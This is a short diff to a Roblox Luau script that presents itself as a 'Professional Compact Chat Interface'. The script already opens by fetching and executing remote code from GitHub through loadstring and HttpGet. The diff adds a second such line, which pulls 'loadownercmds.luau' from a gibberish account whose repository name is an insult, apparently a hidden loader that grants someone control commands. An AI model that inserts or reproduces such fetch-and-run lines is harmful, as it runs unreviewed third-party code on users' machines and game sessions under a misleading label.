@@ -1,4 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fjkdvbjkfvjkfbvjkfbvjkdfhdfjkhvuldfhv/deinemudda/refs/heads/main/loadownercmds.luau"))()
 
 -- Professional Compact Chat Interface
 -- Optimized for all devices with enhanced features
